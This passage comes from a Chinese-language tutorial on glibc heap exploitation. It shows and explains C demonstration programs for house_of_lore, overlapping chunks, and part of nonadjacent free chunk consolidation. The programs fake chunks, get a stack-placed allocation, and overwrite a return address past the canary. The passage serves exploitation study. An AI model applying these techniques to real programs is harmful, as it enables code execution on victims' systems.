&nbsp;&nbsp;printf(&quot;Now&nbsp;allocating&nbsp;a&nbsp;chunk&nbsp;with&nbsp;size&nbsp;equal&nbsp;to&nbsp;the&nbsp;first&nbsp;one&nbsp;freed\n&quot;);
&nbsp;&nbsp;printf(&quot;This&nbsp;should&nbsp;return&nbsp;the&nbsp;overwritten&nbsp;victim&nbsp;chunk&nbsp;and&nbsp;set&nbsp;the&nbsp;bin-&gt;bk&nbsp;to&nbsp;the&nbsp;injected&nbsp;victim-&gt;bk&nbsp;pointer\n&quot;);

&nbsp;&nbsp;void&nbsp;*p3&nbsp;=&nbsp;malloc(0x80);
&nbsp;&nbsp;printf(&quot;p3&nbsp;=&nbsp;%p\n&quot;,p3&nbsp;);

&nbsp;&nbsp;printf(&quot;This&nbsp;last&nbsp;malloc&nbsp;should&nbsp;trick&nbsp;the&nbsp;glibc&nbsp;malloc&nbsp;to&nbsp;return&nbsp;a&nbsp;chunk&nbsp;at&nbsp;the&nbsp;position&nbsp;injected&nbsp;in&nbsp;bin-&gt;bk\n&quot;);
&nbsp;&nbsp;char&nbsp;*p4&nbsp;=&nbsp;malloc(0x80);
&nbsp;&nbsp;printf(&quot;p4&nbsp;=&nbsp;malloc(0x80)\n&quot;);
&nbsp;&nbsp;printf(&quot;\nThe&nbsp;fwd&nbsp;pointer&nbsp;of&nbsp;stack_buffer_2&nbsp;has&nbsp;changed&nbsp;after&nbsp;the&nbsp;last&nbsp;malloc&nbsp;to&nbsp;%p\n&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stack_buffer_2[2]);
&nbsp;&nbsp;printf(&quot;\np4&nbsp;is&nbsp;%p&nbsp;and&nbsp;should&nbsp;be&nbsp;on&nbsp;the&nbsp;stack!\n&quot;,&nbsp;p4);&nbsp;//&nbsp;this&nbsp;chunk&nbsp;will&nbsp;be&nbsp;allocated&nbsp;on&nbsp;stack
&nbsp;&nbsp;intptr_t&nbsp;sc&nbsp;=&nbsp;(intptr_t)jackpot;&nbsp;//&nbsp;Emulating&nbsp;our&nbsp;in-memory&nbsp;shellcode
&nbsp;&nbsp;memcpy((p4+40),&nbsp;&amp;sc,&nbsp;8);&nbsp;//&nbsp;This&nbsp;bypasses&nbsp;stack-smash&nbsp;detection&nbsp;since&nbsp;it&nbsp;jumps&nbsp;over&nbsp;the&nbsp;canary
}</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">翻译</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在栈上有分配两个数组如下</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">intptr_t*&nbsp;stack_buffer_1[4]&nbsp;=&nbsp;{0};&nbsp;&nbsp;
intptr_t*&nbsp;stack_buffer_2[3]&nbsp;=&nbsp;{0};</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">分配好victim chunk</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">victim&nbsp;=&nbsp;malloc(0x80)
intptr_t*&nbsp;victim_chunk&nbsp;=&nbsp;victim-2;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这是heap上的第一个small chunk</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后在栈上制造一个fake chunk</span></p><pre class="brush:cpp;toolbar:false">stack_buffer_1[2]&nbsp;=&nbsp;victim_chunk;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里的<strong>stack_buffer_1[2]</strong>刚好是我们要构造的第一个fake_chunk的fd指针的位置。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上面的操作可以pass掉后面malloc对于smallbin的检查。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">再进行下面的操作：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">stack_buffer_1[3]&nbsp;=&nbsp;(intptr_t*)stack_buffer_2;
stack_buffer_2[2]&nbsp;=&nbsp;(intptr_t*)stack_buffer_1;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">stack_buffer_1[3]是第一个fake chunk的bk字段</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">和上面一样是为了pass掉malloc的检查。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后申请一块大内存，来防止等一下free的时候把我们精心构造好的victim chunk给合并了。</span></p><pre class="brush:cpp;toolbar:false">void&nbsp;*p5&nbsp;=&nbsp;malloc(1000);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在把victim chunk给free掉，之后它会被放入unsortedbin中。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">放入unsortedbin之后victim chunk的fd和bk会同时指向unsortedbin的头部。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在执行一个不能被unsortedbin和smallbin响应的malloc。</span></p><pre class="brush:cpp;toolbar:false">void&nbsp;*p2&nbsp;=&nbsp;malloc(1200);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">malloc之后victim chunk将会从unsortedbin转移到smallbin中。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">同时它的fd和bk也会更新，改为指向smallbin的头部。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在假设发生了溢出改写了victim的bk指针</span></p><pre class="brush:cpp;toolbar:false">victim[1]&nbsp;=&nbsp;(intptr_t)stack_buffer_1;&nbsp;//&nbsp;victim-&gt;bk&nbsp;is&nbsp;pointing&nbsp;to&nbsp;stack</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在开始malloc和victim大小相同的内存块。</span></p><pre class="brush:cpp;toolbar:false">p3&nbsp;=&nbsp;malloc(0x80);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">返回给p3地址就是原来的victim地址，而且此时前面伪造的fake chunk也被连接到了smallbin上。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">再次malloc</span></p><pre class="brush:cpp;toolbar:false">p4&nbsp;=&nbsp;malloc(0x80);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这次返回的p4就将是一个栈地址！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个技术最重要的地方在于成功将victim chunk和两个fake chunk构造成双向链表。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还是给个示意图：</span></p><p style="text-align: center;"><img src="http://p8.qhimg.com/t0168e713a7e70d6fef.png" alt=""/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这就是布局好的双向链表。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到<strong>stack_buffer_2</strong>的bk字段是空着的，那是因为我们这时没有进行信息的泄露，如果泄露出<strong>smallbin_head</strong>的值并填上去的话，这个链表才算是完整，当然如果没必要的话可以不这样做。尽管之后的针对这个smallbin的malloc会报错。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在前面我补充说过：</span></p><pre class="brush:plain;toolbar:false">【注】：源码我改动过，使其编译为64位可执行文件仍能正常运行。其实不改的话也能正常运行，不过改了之后看得更直观。</pre><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">原来的代码中victim chunk的大小是100，malloc之后会对齐到0x70。</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x70在32位系统上属于smallbin，在64位系统上属于fastbin。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">原本针对32位程序的代码编译为64位程序也能正常运行，这是为什么？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是因为，不管这个0x70大小的victim chunk是先加入unsotedbin还是fastbin，在之后都会被加入到smallbin中，smallbin也有0x70大小的链表！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看下图，这时victim chunk被加入fastbin链表的时候：</span></p><p style="text-align: center;"><img src="http://p7.qhimg.com/t01388f111c157f2c12.png" alt=""/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在经过<strong> void *p2 = malloc(1200); </strong>后：</span></p><p style="text-align: center;"><img src="http://p3.qhimg.com/t0111bd272d310d4067.png" alt=""/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">而在我改过代码之后，victim chunk就是正常地先加入unsortedbin再加入smallbin了。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x06 overlapping_chunks</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 112, 192);">源码：</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">/*
&nbsp;A&nbsp;simple&nbsp;tale&nbsp;of&nbsp;overlapping&nbsp;chunk.
&nbsp;This&nbsp;technique&nbsp;is&nbsp;taken&nbsp;from
&nbsp;http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf
*/
#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;string.h&gt;
#include&nbsp;&lt;stdint.h&gt;
int&nbsp;main(int&nbsp;argc&nbsp;,&nbsp;char*&nbsp;argv[]){
&nbsp;&nbsp;intptr_t&nbsp;*p1,*p2,*p3,*p4;
&nbsp;&nbsp;printf(&quot;\nThis&nbsp;is&nbsp;a&nbsp;simple&nbsp;chunks&nbsp;overlapping&nbsp;problem\n\n&quot;);
&nbsp;&nbsp;printf(&quot;Let&#39;s&nbsp;start&nbsp;to&nbsp;allocate&nbsp;3&nbsp;chunks&nbsp;on&nbsp;the&nbsp;heap\n&quot;);
&nbsp;&nbsp;p1&nbsp;=&nbsp;malloc(0x100&nbsp;-&nbsp;8);
&nbsp;&nbsp;p2&nbsp;=&nbsp;malloc(0x100&nbsp;-&nbsp;8);
&nbsp;&nbsp;p3&nbsp;=&nbsp;malloc(0x80&nbsp;-&nbsp;8);
&nbsp;&nbsp;printf(&quot;The&nbsp;3&nbsp;chunks&nbsp;have&nbsp;been&nbsp;allocated&nbsp;here:\np1=%p\np2=%p\np3=%p\n&quot;,&nbsp;p1,&nbsp;p2,&nbsp;p3);
&nbsp;&nbsp;memset(p1,&nbsp;&#39;1&#39;,&nbsp;0x100&nbsp;-&nbsp;8);
&nbsp;&nbsp;memset(p2,&nbsp;&#39;2&#39;,&nbsp;0x100&nbsp;-&nbsp;8);
&nbsp;&nbsp;memset(p3,&nbsp;&#39;3&#39;,&nbsp;0x80&nbsp;-&nbsp;8);
&nbsp;&nbsp;printf(&quot;\nNow&nbsp;let&#39;s&nbsp;free&nbsp;the&nbsp;chunk&nbsp;p2\n&quot;);
&nbsp;&nbsp;free(p2);
&nbsp;&nbsp;printf(&quot;The&nbsp;chunk&nbsp;p2&nbsp;is&nbsp;now&nbsp;in&nbsp;the&nbsp;unsorted&nbsp;bin&nbsp;ready&nbsp;to&nbsp;serve&nbsp;possible\nnew&nbsp;malloc()&nbsp;of&nbsp;its&nbsp;size\n&quot;);

&nbsp;&nbsp;printf(&quot;Now&nbsp;let&#39;s&nbsp;simulate&nbsp;an&nbsp;overflow&nbsp;that&nbsp;can&nbsp;overwrite&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;chunk&nbsp;freed&nbsp;p2.\n&quot;);
&nbsp;&nbsp;printf(&quot;For&nbsp;a&nbsp;toy&nbsp;program,&nbsp;the&nbsp;value&nbsp;of&nbsp;the&nbsp;last&nbsp;3&nbsp;bits&nbsp;is&nbsp;unimportant;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&nbsp;however,&nbsp;it&nbsp;is&nbsp;best&nbsp;to&nbsp;maintain&nbsp;the&nbsp;stability&nbsp;of&nbsp;the&nbsp;heap.\n&quot;);
&nbsp;&nbsp;printf(&quot;To&nbsp;achieve&nbsp;this&nbsp;stability&nbsp;we&nbsp;will&nbsp;mark&nbsp;the&nbsp;least&nbsp;signifigant&nbsp;bit&nbsp;as&nbsp;1&nbsp;(prev_inuse),&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&nbsp;to&nbsp;assure&nbsp;that&nbsp;p1&nbsp;is&nbsp;not&nbsp;mistaken&nbsp;for&nbsp;a&nbsp;free&nbsp;chunk.\n&quot;);

&nbsp;&nbsp;int&nbsp;evil_chunk_size&nbsp;=&nbsp;0x181;
&nbsp;&nbsp;int&nbsp;evil_region_size&nbsp;=&nbsp;0x180&nbsp;-&nbsp;8;
&nbsp;&nbsp;printf(&quot;We&nbsp;are&nbsp;going&nbsp;to&nbsp;set&nbsp;the&nbsp;size&nbsp;of&nbsp;chunk&nbsp;p2&nbsp;to&nbsp;to&nbsp;%d,&nbsp;which&nbsp;gives&nbsp;us\na&nbsp;region&nbsp;size&nbsp;of&nbsp;%d\n&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;evil_chunk_size,&nbsp;evil_region_size);

&nbsp;&nbsp;*(p2-1)&nbsp;=&nbsp;evil_chunk_size;&nbsp;//&nbsp;we&nbsp;are&nbsp;overwriting&nbsp;the&nbsp;&quot;size&quot;&nbsp;field&nbsp;of&nbsp;chunk&nbsp;p2

&nbsp;&nbsp;printf(&quot;\nNow&nbsp;let&#39;s&nbsp;allocate&nbsp;another&nbsp;chunk&nbsp;with&nbsp;a&nbsp;size&nbsp;equal&nbsp;to&nbsp;the&nbsp;data\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;size&nbsp;of&nbsp;the&nbsp;chunk&nbsp;p2&nbsp;injected&nbsp;size\n&quot;);
&nbsp;&nbsp;printf(&quot;This&nbsp;malloc&nbsp;will&nbsp;be&nbsp;served&nbsp;from&nbsp;the&nbsp;previously&nbsp;freed&nbsp;chunk&nbsp;that\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;is&nbsp;parked&nbsp;in&nbsp;the&nbsp;unsorted&nbsp;bin&nbsp;which&nbsp;size&nbsp;has&nbsp;been&nbsp;modified&nbsp;by&nbsp;us\n&quot;);
&nbsp;&nbsp;p4&nbsp;=&nbsp;malloc(evil_region_size);
&nbsp;&nbsp;printf(&quot;\np4&nbsp;has&nbsp;been&nbsp;allocated&nbsp;at&nbsp;%p&nbsp;and&nbsp;ends&nbsp;at&nbsp;%p\n&quot;,&nbsp;p4,&nbsp;p4+evil_region_size);
&nbsp;&nbsp;printf(&quot;p3&nbsp;starts&nbsp;at&nbsp;%p&nbsp;and&nbsp;ends&nbsp;at&nbsp;%p\n&quot;,&nbsp;p3,&nbsp;p3+80);
&nbsp;&nbsp;printf(&quot;p4&nbsp;should&nbsp;overlap&nbsp;with&nbsp;p3,&nbsp;in&nbsp;this&nbsp;case&nbsp;p4&nbsp;includes&nbsp;all&nbsp;p3.\n&quot;);

&nbsp;&nbsp;printf(&quot;\nNow&nbsp;everything&nbsp;copied&nbsp;inside&nbsp;chunk&nbsp;p4&nbsp;can&nbsp;overwrites&nbsp;data&nbsp;on\nchunk&nbsp;p3,&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&nbsp;and&nbsp;data&nbsp;written&nbsp;to&nbsp;chunk&nbsp;p3&nbsp;can&nbsp;overwrite&nbsp;data\nstored&nbsp;in&nbsp;the&nbsp;p4&nbsp;chunk.\n\n&quot;);

&nbsp;&nbsp;printf(&quot;Let&#39;s&nbsp;run&nbsp;through&nbsp;an&nbsp;example.&nbsp;Right&nbsp;now,&nbsp;we&nbsp;have:\n&quot;);
&nbsp;&nbsp;printf(&quot;p4&nbsp;=&nbsp;%s\n&quot;,&nbsp;(char&nbsp;*)p4);
&nbsp;&nbsp;printf(&quot;p3&nbsp;=&nbsp;%s\n&quot;,&nbsp;(char&nbsp;*)p3);

&nbsp;&nbsp;printf(&quot;\nIf&nbsp;we&nbsp;memset(p4,&nbsp;&#39;4&#39;,&nbsp;%d),&nbsp;we&nbsp;have:\n&quot;,&nbsp;evil_region_size);
&nbsp;&nbsp;memset(p4,&nbsp;&#39;4&#39;,&nbsp;evil_region_size);
&nbsp;&nbsp;printf(&quot;p4&nbsp;=&nbsp;%s\n&quot;,&nbsp;(char&nbsp;*)p4);
&nbsp;&nbsp;printf(&quot;p3&nbsp;=&nbsp;%s\n&quot;,&nbsp;(char&nbsp;*)p3);

&nbsp;&nbsp;printf(&quot;\nAnd&nbsp;if&nbsp;we&nbsp;then&nbsp;memset(p3,&nbsp;&#39;3&#39;,&nbsp;80),&nbsp;we&nbsp;have:\n&quot;);
&nbsp;&nbsp;memset(p3,&nbsp;&#39;3&#39;,&nbsp;80);
&nbsp;&nbsp;printf(&quot;p4&nbsp;=&nbsp;%s\n&quot;,&nbsp;(char&nbsp;*)p4);
&nbsp;&nbsp;printf(&quot;p3&nbsp;=&nbsp;%s\n&quot;,&nbsp;(char&nbsp;*)p3);
}</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">翻译：</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是一个简单的堆块重叠的问题。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">先malloc三个堆块：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">p1&nbsp;=&nbsp;malloc(0x100&nbsp;-&nbsp;8);
p2&nbsp;=&nbsp;malloc(0x100&nbsp;-&nbsp;8);
p3&nbsp;=&nbsp;malloc(0x80&nbsp;-&nbsp;8);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在free掉p2</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">p2被free之后加入到了unsortedbin链表中待命</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在让我们模拟一个可以改写p2.size的溢出。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">int&nbsp;evil_chunk_size&nbsp;=&nbsp;0x181;
*(p2-1)&nbsp;=&nbsp;evil_chunk_size;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对于我们这个例子来讲三个标志位影响不是很大，但是为了保持堆的稳定性，还是不要随意改动。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">至少我们要确保pre_in_use为true，不要让p1被误认为被free了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们将p2的size改写为0x181，之后的malloc就会返回给我们一个0x178（可使用大小）的堆块。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">...</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面的就不再翻译了，大概意思就是malloc(0x178)返回了p2的地址，而且包含了整个p3在里面。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">int&nbsp;evil_region_size&nbsp;=&nbsp;0x180&nbsp;-&nbsp;8;
p4&nbsp;=&nbsp;malloc(evil_region_size);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">返回给p4的地址就是原来p2的，而且p4中包含了还没被free的p3。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们前面通过溢出一个null byte来达到overlapping chunk的效果。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里就非常简单暴力了，直接修改已经free的chunk的size字段，而且只用修改这个字段，就可以达到攻击的目的了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后的malloc就可以返回一个带有overlapping效果的chunk。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">没太多可讲的，整个过程也比较简单。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x07 overlapping_chunks_2</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">源码：</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">/*
&nbsp;Yet&nbsp;another&nbsp;simple&nbsp;tale&nbsp;of&nbsp;overlapping&nbsp;chunk.
&nbsp;This&nbsp;technique&nbsp;is&nbsp;taken&nbsp;from
&nbsp;https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.
&nbsp;This&nbsp;is&nbsp;also&nbsp;referenced&nbsp;as&nbsp;Nonadjacent&nbsp;Free&nbsp;Chunk&nbsp;Consolidation&nbsp;Attack.
*/
#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;string.h&gt;
#include&nbsp;&lt;stdint.h&gt;
#include&nbsp;&lt;malloc.h&gt;
int&nbsp;main(){
&nbsp;&nbsp;intptr_t&nbsp;*p1,*p2,*p3,*p4,*p5,*p6;
&nbsp;&nbsp;unsigned&nbsp;int&nbsp;real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
&nbsp;&nbsp;int&nbsp;prev_in_use&nbsp;=&nbsp;0x1;
&nbsp;&nbsp;printf(&quot;\nThis&nbsp;is&nbsp;a&nbsp;simple&nbsp;chunks&nbsp;overlapping&nbsp;problem&quot;);
&nbsp;&nbsp;printf(&quot;\nThis&nbsp;is&nbsp;also&nbsp;referenced&nbsp;as&nbsp;Nonadjacent&nbsp;Free&nbsp;Chunk&nbsp;Consolidation&nbsp;Attack\n&quot;);
&nbsp;&nbsp;printf(&quot;\nLet&#39;s&nbsp;start&nbsp;to&nbsp;allocate&nbsp;5&nbsp;chunks&nbsp;on&nbsp;the&nbsp;heap:&quot;);
&nbsp;&nbsp;p1&nbsp;=&nbsp;malloc(1000);
&nbsp;&nbsp;p2&nbsp;=&nbsp;malloc(1000);
&nbsp;&nbsp;p3&nbsp;=&nbsp;malloc(1000);
&nbsp;&nbsp;p4&nbsp;=&nbsp;malloc(1000);
&nbsp;&nbsp;p5&nbsp;=&nbsp;malloc(1000);
&nbsp;&nbsp;real_size_p1&nbsp;=&nbsp;malloc_usable_size(p1);
&nbsp;&nbsp;real_size_p2&nbsp;=&nbsp;malloc_usable_size(p2);
&nbsp;&nbsp;real_size_p3&nbsp;=&nbsp;malloc_usable_size(p3);
&nbsp;&nbsp;real_size_p4&nbsp;=&nbsp;malloc_usable_size(p4);
&nbsp;&nbsp;real_size_p5&nbsp;=&nbsp;malloc_usable_size(p5);

&nbsp;&nbsp;printf(&quot;\n\nchunk&nbsp;p1&nbsp;from&nbsp;%p&nbsp;to&nbsp;%p&quot;,&nbsp;p1,&nbsp;(unsigned&nbsp;char&nbsp;*)p1+malloc_usable_size(p1));
&nbsp;&nbsp;printf(&quot;\nchunk&nbsp;p2&nbsp;from&nbsp;%p&nbsp;to&nbsp;%p&quot;,&nbsp;p2,&nbsp;&nbsp;(unsigned&nbsp;char&nbsp;*)p2+malloc_usable_size(p2));
&nbsp;&nbsp;printf(&quot;\nchunk&nbsp;p3&nbsp;from&nbsp;%p&nbsp;to&nbsp;%p&quot;,&nbsp;p3,&nbsp;&nbsp;(unsigned&nbsp;char&nbsp;*)p3+malloc_usable_size(p3));
&nbsp;&nbsp;printf(&quot;\nchunk&nbsp;p4&nbsp;from&nbsp;%p&nbsp;to&nbsp;%p&quot;,&nbsp;p4,&nbsp;(unsigned&nbsp;char&nbsp;*)p4+malloc_usable_size(p4));
&nbsp;&nbsp;printf(&quot;\nchunk&nbsp;p5&nbsp;from&nbsp;%p&nbsp;to&nbsp;%p\n&quot;,&nbsp;p5,&nbsp;&nbsp;(unsigned&nbsp;char&nbsp;*)p5+malloc_usable_size(p5));

&nbsp;&nbsp;memset(p1,&#39;A&#39;,real_size_p1);
&nbsp;&nbsp;memset(p2,&#39;B&#39;,real_size_p2);
&nbsp;&nbsp;memset(p3,&#39;C&#39;,real_size_p3);
&nbsp;&nbsp;memset(p4,&#39;D&#39;,real_size_p4);
&nbsp;&nbsp;memset(p5,&#39;E&#39;,real_size_p5);
&nbsp;
&nbsp;&nbsp;printf(&quot;\nLet&#39;s&nbsp;free&nbsp;the&nbsp;chunk&nbsp;p4.\nIn&nbsp;this&nbsp;case&nbsp;this&nbsp;isn&#39;t&nbsp;coealesced&nbsp;with&nbsp;top&nbsp;chunk&nbsp;since&nbsp;we&nbsp;have&nbsp;p5&nbsp;bordering&nbsp;top&nbsp;chunk&nbsp;after&nbsp;p4\n&quot;);&nbsp;

&nbsp;&nbsp;free(p4);

&nbsp;&nbsp;printf(&quot;\nLet&#39;s&nbsp;trigger&nbsp;the&nbsp;vulnerability&nbsp;on&nbsp;chunk&nbsp;p1&nbsp;that&nbsp;overwrites&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;in&nbsp;use&nbsp;chunk&nbsp;p2\nwith&nbsp;the&nbsp;size&nbsp;of&nbsp;chunk_p2&nbsp;+&nbsp;size&nbsp;of&nbsp;chunk_p3\n&quot;);

&nbsp;&nbsp;*(unsigned&nbsp;int&nbsp;*)((unsigned&nbsp;char&nbsp;*)p1&nbsp;+&nbsp;real_size_p1&nbsp;)&nbsp;=&nbsp;real_size_p2&nbsp;+&nbsp;real_size_p3&nbsp;+&nbsp;prev_in_use&nbsp;+&nbsp;sizeof(size_t)&nbsp;*&nbsp;2;&nbsp;//&lt;---&nbsp;BUG&nbsp;HERE&nbsp;

&nbsp;&nbsp;printf(&quot;\nNow&nbsp;during&nbsp;the&nbsp;free()&nbsp;operation&nbsp;on&nbsp;p2,&nbsp;the&nbsp;allocator&nbsp;is&nbsp;fooled&nbsp;to&nbsp;think&nbsp;that&nbsp;\nthe&nbsp;nextchunk&nbsp;is&nbsp;p4&nbsp;(&nbsp;since&nbsp;p2&nbsp;+&nbsp;size_p2&nbsp;now&nbsp;point&nbsp;to&nbsp;p4&nbsp;)&nbsp;\n&quot;);
&nbsp;&nbsp;printf(&quot;\nThis&nbsp;operation&nbsp;will&nbsp;basically&nbsp;create&nbsp;a&nbsp;big&nbsp;free&nbsp;chunk&nbsp;that&nbsp;wrongly&nbsp;includes&nbsp;p3\n&quot;);
&nbsp;&nbsp;free(p2);
